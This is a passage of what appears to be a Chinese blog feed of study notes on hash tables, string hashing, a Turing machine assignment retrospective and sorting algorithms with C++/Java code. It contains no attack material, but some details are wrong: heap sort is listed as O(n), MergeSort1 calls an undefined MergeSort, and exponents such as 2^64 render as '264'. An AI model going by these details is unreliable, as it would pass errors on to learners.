 <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    array[hashVal].<span class="built_in"><span class="keyword">delete</span></span>(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-开放寻址法"><a class="header-anchor" href="#2-开放寻址法">¶</a>2.开放寻址法</h3><p>基本思路比较容易理解就是只在一个数组中进行操作，防止溢出范围一般要开到题目范围的2-3倍。</p><p>假如我们求出的哈希值hash（x） == k，我们就在一个数组从第k个位置开始，如果该位置被占用，则依次看下一个位置，直到找到空位置为止。</p><p>找下一个位置也有不同的方法</p><h4 id="线性探测"><a class="header-anchor" href="#线性探测">¶</a><strong>线性探测</strong></h4><p>插入思路很朴素：下标一位一位后移，直到为空。查找同理，先算得理论下标，向后逐位比对，若遍历至空位，说明没有。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Student student)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = student.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null &amp;&amp; array[hashVal].<span class="built_in">getKey</span>() != <span class="number">-1</span>) &#123;</span><br><span class="line">        ++hashVal;</span><br><span class="line">        <span class="comment">// 如果超过数组大小，则从第一个开始找</span></span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    array[hashVal] = student;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null)&#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key)&#123;</span><br><span class="line">            <span class="keyword">return</span> array[hashVal];</span><br><span class="line">        &#125;</span><br><span class="line">        ++hashVal;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线性探测哈希表的删除相对来说比较复杂一点，我们不能简单的把这一项数据删除，让它变成空，为什么呢？</p><p>线性探测哈希表在查找的时候，一旦我们通过线性探测方法，找到一个空闲位置，我们就可以认定哈希表中不存在这个数据。但是，如果这个空闲位置是我们后来删除的，就会<strong>导致原来的查找算法失效</strong>。本来存在的数据，会被认定为不存在。</p><p>因此我们需要一个<strong>特殊的数据</strong>来顶替这个被删除的数据，因为我们的学生学号都是正数，所以我们用学号等于<code>-1</code>来代表被删除的数据。这样会带来一个问题，如何在线性探测哈希表中做了多次操作，会导致哈希表中充满了学号为<code>-1</code>的数据项，使的哈希表的效率下降，所以很多哈希表中没有提供删除操作，即使提供了删除操作的，也尽量少使用删除函数。</p><h4 id="二次探测"><a class="header-anchor" href="#二次探测">¶</a><strong>二次探测</strong></h4><p>在线性探测哈希表中，数据会发生聚集，一旦聚集形成，它就会变的越来越大，那些哈希函数后落在聚集范围内的数据项，都需要一步一步往后移动，并且插入到聚集的后面，因此聚集变的越大，聚集增长的越快。这个就像我们在逛超市一样，当某个地方人很多时，人只会越来越多，大家都只是想知道这里在干什么。</p><p>二次探测是防止聚集产生的一种尝试，思想是探测相隔较远的单元，而不是和原始位置相邻的单元。在线性探测中，如果哈希函数得到的原始下标是x,线性探测就是x+1,x+2,x+3…，以此类推，而在二次探测中，探测过程是x+1,x+4,x+9,x+16,x+25…,以此类推，到原始距离的步数平方</p><h4 id="双哈希（常用）"><a class="header-anchor" href="#双哈希（常用）">¶</a><strong>双哈希</strong>（常用）</h4><p>双哈希是为了消除原始聚集和二次聚集问题，不管是线性探测还是二次探测，每次的探测步长都是固定的。双哈希是除了第一个哈希函数外再增加一个哈希函数用来根据关键字生成探测步长，这样即使第一个哈希函数映射到了数组的同一下标，但是探测步长不一样，这样就能够解决聚集的问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Student student)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = student.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="comment">// 获取步长</span></span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null &amp;&amp; array[hashVal].<span class="built_in">getKey</span>() != <span class="number">-1</span>) &#123;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        <span class="comment">// 如果超过数组大小，则从第一个开始找</span></span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    array[hashVal] = student;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> array[hashVal];</span><br><span class="line">        &#125;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">delete</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key) &#123;</span><br><span class="line">            Student temp = array[hashVal];</span><br><span class="line">            array[hashVal] = noStudent;</span><br><span class="line">            <span class="keyword">return</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双哈希的实现比较简单，但是双哈希有一个特别高的要求就是表的容量需要是一个质数，为什么呢？</p><p><strong>为什么双哈希需要哈希表的容量是一个质数？</strong></p><p>假设我们哈希表的容量为15，某个**「关键字」**经过双哈希函数后得到的数组下标为0，步长为5。那么这个探测过程是0,5,10,0,5,10，一直只会尝试这三个位置，永远找不到空白位置来存放，最终会导致崩溃。</p><p>如果我们哈希表的大小为13，某个**「关键字」**经过双哈希函数后得到的数组下标为0，步长为5。那么这个探测过程是0,5,10,2,7,12,4,9,1,6,11,3。会查找到哈希表中的每一个位置。</p><p>使用开放地址法，不管使用那种策略都会有各种问题，开放地址法不怎么使用，在开放地址法中使用较多的是双哈希策略。</p><h2 id="字符串哈希"><a class="header-anchor" href="#字符串哈希">¶</a>字符串哈希</h2><p>通过比对字符串的哈希值的方法快速判断两个字符串是否相同，操作及思路比KMP方法简单。</p><h3 id="求字符串前缀的哈希值"><a class="header-anchor" href="#求字符串前缀的哈希值">¶</a>求字符串前缀的哈希值</h3><p>将一个字符串看成一个P进制的数，最后转化成10进制数</p><p>假如我们要求一个字符串ABCD的哈希值，ABCD对应1234</p><p>ABCD<br>1234<br>我们要求的就是字符串的前缀哈希值<br>h[0] = 0<br>h[1] = 'A’的哈希值<br>h[2] = 'AB’的哈希值<br>h[3] = 'ABC’的哈希值<br>h[4] = 'ABCD’的哈希值</p><p>ABCD的哈希值 h[4] =（1234）p = 1 * P3 + 2 * P 2 + 3 * P1 + 4 * P0</p><p>因为转化后的数字可能很大，所以我们要对所求的哈希值对Q取模</p><p>通过这样一种方式就可以把任意一个字符串映射成一个0~Q-1的数了</p><p>注意：<br>1.不能将字母映射成0，一般从1开始映射，不然会使不同的字符串的哈希值相同</p><p>2.有这样一组经验值，当P = 131 或 13331 Q = 264，且我们不那么非，在99.99%的情况下不存在冲突，<s>这可不是我说的</s></p><p>3.因为Q = 264，所以我们用unsigned long long来存储所有的哈希值，就不需要对Q取模了。因为会溢出，所以就等价于取模了</p><h3 id="求任意字串的哈希值"><a class="header-anchor" href="#求任意字串的哈希值">¶</a>求任意字串的哈希值</h3><p>我们可以利用我们所求得的前缀哈希用一个公式算出来任意一个子串的哈希值</p><p>假设我们已知两个前缀哈希值h[R],h[L - 1], 目标是求得L~R的哈希值</p><p>即h[L~R] = h[R] -h[L-1] * PR-L+1</p><p>证明过程如下：</p><p>h[R] = 1 * PR-1 + 2 * PR-2 + …+ R * P0<br>h[L-1] = 1 * PL-2 + 2 * PL-2 + …+ (L-1) * P0<br>要求的L~R的哈希值， 我们需要将h[L-1] * PR-L+1 = 1 * PR-1 + 2 * PR-2 + …+ (L-1) * PR-L+1<br>h[L~R] = L * PR-L + (L+1) * PR-L-1 + …+ R * P0 = h[R] - h[L-1] * PR-L+1</p><p>其实本质就是进制转换</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TM Reflection</title>
      <link href="/2021/07/23/TM%20Reflection/"/>
      <url>/2021/07/23/TM%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1>TM Reflection</h1><p>这是第二次图灵机大作业完成后的反思与总结，将分为如下几部分：</p><ul><li>架构的反思</li><li>debug的过程</li></ul><h2 id="架构的反思"><a class="header-anchor" href="#架构的反思">¶</a>架构的反思</h2><p>1.TuringMachine的构造函数过于复杂，夹杂了许多功能，可创建Util工具类，使代码低耦合，数据与职责一致</p><p>2.Q, State,TransitionFuction之间的映射关系要理清，是个不错的架构，值得学习</p><p>3.对于Executor，它拥有的是Tapes，因此他的快照等功能应该是调用Tape的方法来“拼凑”实现整体，而不应该在Executor中调用到Tracks层面</p><h2 id="debug的过程"><a class="header-anchor" href="#debug的过程">¶</a>debug的过程</h2><p>1.第一次运行，什么错误信息都没有，什么输出都没有，合理推测问题在Execute方法，处理了一系列格式化问题，都怪猪脚需求写的不清楚（拍桌子）</p><p>发现需要知道空格符号，使我下定了改为自顶而下架构的决心，Executor没有理由需要知道B是什么符号，一次重构，费了点时间，但也算有收获</p><p>2.肉眼对比输出结果的我像个憨批，下次丕定（</p><p>3.第二次运行，发现多报了错误流信息，居然把String直接扔到Character集合中了，我当时怕是写傻了</p><p>4.顺手把错误检查全过了，Resolver判断是否冲突需要对上文所说两重映射完全理解</p><p>5.最后一出错点，挂掉我4个用例，居然是很浅显的错误，移动磁头（我一直很相信你的啊喂……），再一次警告自己不要乱复制</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法整理</title>
      <link href="/2021/07/23/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/"/>
      <url>/2021/07/23/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1>排序算法</h1><p>对各类排序方法整理如下：</p><table><thead><tr><th><strong>排序算法</strong></th><th><strong>时间复杂度</strong></th></tr></thead><tbody><tr><td>归并排序</td><td>Ο(nlog2n)</td></tr><tr><td>快速排序</td><td>极端Ο(n2)，最好Ο(nlog2n)</td></tr><tr><td>堆排序</td><td>Ο(n)</td></tr><tr><td>计数排序</td><td>O(n+k),k为整数的范围</td></tr><tr><td>基数排序</td><td><em><em>Ο((n + k) <em>d)</em></em> ，n指</em><em>分配</em><em>n个数要n次，k指</em><em>构建k个桶</em>*，d为位数**)</td></tr></tbody></table><h2 id="归并排序"><a class="header-anchor" href="#归并排序">¶</a><strong>归并排序</strong></h2><p>如下图，假设要对长度为n的数列A进行排序，归并排序的思想就是<strong>Divide&amp;Conquer</strong>分开并克服，首先将A着半拆分为左数列L和有数列R，然后分别对L和R进行各自的排序，最后进行L和R的合并操作。</p><p><img src="https://img2020.cnblogs.com/blog/1820479/202004/1820479-20200403104649348-448131316.png" alt="img"></p><p>在该课程里，讲师提到了归并排序用的是一种叫<strong>Two Fingers双指算法</strong>，这里我用上图的列子进行讲述：</p><ol><li>如果数列a为[20,13,7,2,12,11,9,1]，将它折半拆为左数列L：[20,13,7,2]，右数列R：[12, 11, 9, 1];</li><li>对数列L和R各自进行排序，方法用冒泡排序或其他排序手段都行;</li><li>之后用箭头（指代手指）指向数列L和R最小的元素，进行比较，并先输出这个最小的元素，如上图就是min(1,2)=1。</li><li>之后在该最小元素下移动箭头至下一个元素，将其与原来另一个数列元素进行比较，如上图就是数列R的箭头移至9, 数列L由于上一步不是最小值，所以箭头不变，则对比箭头所指元素的到min(2, 9)=2，输出结果。重复上述操作箭头到达各自数列末尾。</li></ol><p>如下图所示，这里复杂度为<strong>Ο(nlog2n)</strong>。这里可以简单的分为两块：（1）<strong>二路归并需要进行log2n次</strong>；（2）<strong>双指算法对单次二路归并进行n次箭头移动（帮助进行最小值比较操作）</strong>。因此就是nlog2n次。</p><p><img src="http://p.qpic.cn/pic_wework/1948211503/2b2dce38f298729431e797ff2f6ca2260c579caa70c3fb3a/0" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> low,<span class="keyword">int</span> mid,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="comment">//low为第1有序区的第1个元素，i指向第1个元素, mid为第1有序区的最后1个元素</span></span><br><span class="line">    <span class="keyword">int</span> i=low,j=mid+<span class="number">1</span>,k=<span class="number">0</span>; <span class="comment">//mid+1为第2有序区第1个元素，j指向第1个元素</span></span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in"><span class="keyword">new</span></span>(nothrow) <span class="keyword">int</span>[high-low+<span class="number">1</span>]; <span class="comment">//temp数组暂存合并的有序序列</span></span><br><span class="line">    <span class="keyword">if</span>(!temp)&#123; <span class="comment">//内存分配失败</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=high)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i]&lt;=arr[j]) <span class="comment">//较小的先存入temp中</span></span><br><span class="line">            temp[k++]=arr[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            temp[k++]=arr[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)<span class="comment">//若比较完之后，第一个有序区仍有剩余，则直接复制到t数组中</span></span><br><span class="line">        temp[k++]=arr[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=high)<span class="comment">//同上</span></span><br><span class="line">        temp[k++]=arr[j++];</span><br><span class="line">    <span class="keyword">for</span>(i=low,k=<span class="number">0</span>;i&lt;=high;i++,k++)<span class="comment">//将排好序的存回arr中low到high这区间</span></span><br><span class="line">arr[i]=temp[k];</span><br><span class="line">    <span class="keyword">delete</span> []temp;<span class="comment">//删除指针，由于指向的是数组，必须用delete []</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//用递归应用二路归并函数实现排序——分治法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort1</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">MergeSort</span>(arr,low,mid);</span><br><span class="line">        <span class="built_in">MergeSort</span>(arr,mid+<span class="number">1</span>,high);</span><br><span class="line">        <span class="built_in">Merge</span>(arr,low,mid,high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用非递归应用二路归并函数实现排序——分治法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort2</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> n)</span><span class="comment">//n代表数组中元素个数，即数组最大下标是n-1&#123;</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function">int step = 1;</span></span></span><br><span class="line"><span class="comment"><span class="function">while(step&lt;n) //当元素个数不是2的幂时可能会出错，未考虑第2个序列个数不足的情况</span></span></span><br><span class="line"><span class="comment"><span class="function">&#123;</span></span></span><br><span class="line"><span class="comment"><span class="function">for(int i=0;i&lt;=n-step-1;i+=2*step)</span></span></span><br><span class="line"><span class="comment"><span class="function">Merge(arr,i,i+step-1,i+2*step-1);</span></span></span><br><span class="line"><span class="comment"><span class="function">step*=2;</span></span></span><br><span class="line"><span class="comment"><span class="function">&#125;*/</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> size</span>=<span class="number">1</span>,low,mid,high;</span><br><span class="line"><span class="keyword">while</span>(size&lt;=n<span class="number">-1</span>)&#123;</span><br><span class="line">low=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(low+size&lt;=n<span class="number">-1</span>)&#123;</span><br><span class="line">mid=low+size<span class="number">-1</span>;</span><br><span class="line">high=mid+size;</span><br><span class="line"><span class="keyword">if</span>(high&gt;n<span class="number">-1</span>)<span class="comment">//第二个序列个数不足size</span></span><br><span class="line">high=n<span class="number">-1</span>;</span><br><span class="line"><span class="built_in">Merge</span>(arr,low,mid,high);<span class="comment">//调用归并子函数</span></span><br><span class="line">low=high+<span class="number">1</span>;<span class="comment">//下一次归并时第一关序列的下界</span></span><br><span class="line">&#125;</span><br><span class="line">size*=<span class="number">2</span>;<span class="comment">//范围扩大一倍</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="快速排序"><a class="header-anchor" href="#快速排序">¶</a>快速排序</h2><p>它是一种非常高效也很常用的排序算法，主要有三个零件：left左指针，right右指针和base基准数。举个例子如下图所示：</p><p><img src="http://p.qpic.cn/pic_wework/1948211503/4046a55350b105743a315ad7a0e8689acd1fee115ea3a730/0" alt="img"></p><ul><li>首先假设数列a为[6, 3, 7, 4, 1]，则<strong>left左指针为数列a最开始的元素</strong>6，<strong>right右指针为数列b最末端的元素</strong>1，<strong>base基准数为left左指针</strong>6（注意这个<strong>base基准数从头到尾都不改动</strong>的）。</li></ul><ol><li>先从right指向的数与base对比：</li></ol><ul><li>如果right&lt;base，则将right值替换left值，然后left向右移一位，同时right值替换为空值，且right指针位置不变，然后让left此时指的数与base对比。</li><li>如果right&gt;base，则将right值替换right值（即保持不变），然后right向左移一位，同时left值替换为空值，且left指针位置不变，然后让right此时指的数与base对比。</li></ul><ol><li>重复上述操作，直到左右指针重叠，此时就直接将base值放入重叠位置即可。</li></ol><p>总结上面的就是：<strong>先右开始对比，之后’小于则替换left并移left，然后新left对比base’或’大于则替换right并移right，然后新right对比base‘, left和right重合后用base替换</strong>。它的时间复杂度<strong>取决于base值真实在排序后的位置</strong>，如果base刚好为<strong>排序中间的位置</strong>，时间复杂度为<strong>Ο(nlog2n)</strong>，如果base为数列<strong>最大值或最小值</strong>，则为<strong>Ο(n2)</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//快速排序（从小到大）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right, vector&lt;<span class="keyword">int</span>&gt;&amp; arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(left &gt;= right)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">int</span> i, j, base, temp;</span><br><span class="line">i = left, j = right;</span><br><span class="line">base = arr[left];  <span class="comment">//取最左边的数为基准数</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (arr[j] &gt;= base &amp;&amp; i &lt; j)</span><br><span class="line">j--;</span><br><span class="line"><span class="keyword">while</span> (arr[i] &lt;= base &amp;&amp; i &lt; j)</span><br><span class="line">i++;</span><br><span class="line"><span class="keyword">if</span>(i &lt; j)</span><br><span class="line">&#123;</span><br><span class="line">temp = arr[i];</span><br><span class="line">arr[i] = arr[j];</span><br><span class="line">arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//基准数归位</span></span><br><span class="line">arr[left] = arr[i];</span><br><span class="line">arr[i] = base;</span><br><span class="line"><span class="built_in">quickSort</span>(left, i - <span class="number">1</span>, arr);<span class="comment">//递归左边</span></span><br><span class="line"><span class="built_in">quickSort</span>(i + <span class="number">1</span>, right, arr);<span class="comment">//递归右边</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计数排序"><a class="header-anchor" href="#计数排序">¶</a>计数排序</h2><p>计数排序并不基于元素的比较，而是一种<strong>利用数组下标来确定元素正确位置的算法</strong>。通过对每个数组中的每个元素进行相应的计数统计，通过计数值确定元素的正确位置的排序算法。计数排序需要知道待排序数据的取值范围，以方便申请辅助空间，这是计数排序的一个缺点。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMyLnpoaW1nLmNvbS84MC92Mi03MmYzY2NiZWUzYzA2YzYyMjRkYTgwMTcwNGY1MjVlZl8xNDQwdy5qcGc?x-oss-process=image/format,png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">counting_sort</span><span class="params">(<span class="keyword">int</span> data[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span>* sorted = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">  <span class="keyword">int</span> max = data[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[i] &gt; max)</span><br><span class="line">      max = data[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span>* count = <span class="keyword">new</span> <span class="keyword">int</span>[max+<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; max+<span class="number">1</span>; ++i)</span><br><span class="line">    count[i] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 记录频次</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    count[data[i]]++;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 累加计数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= max; i++)</span><br><span class="line">    count[i] += count[i - <span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 确定最终位置</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    sorted[count[data[i]] - <span class="number">1</span>] = data[i];</span><br><span class="line">    count[data[i]]--;<span class="comment">//注意</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    data[i] = sorted[i];</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">delete</span> [] sorted;</span><br><span class="line">  <span class="keyword">delete</span> [] count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基数排序"><a class="header-anchor" href="#基数排序">¶</a>基数排序</h2><p>从低位开始，对所有数字进行排序。例如第1轮排序后，数字的个位数要有序；第2轮排序后，数字的十位数要有序，如果十位数相同的数，个位数要按照之前的相对顺序摆放；依次类推直至最高位排序完成。在对每位进行排序时，选择的排序算法一定要是<strong>稳定的排序</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 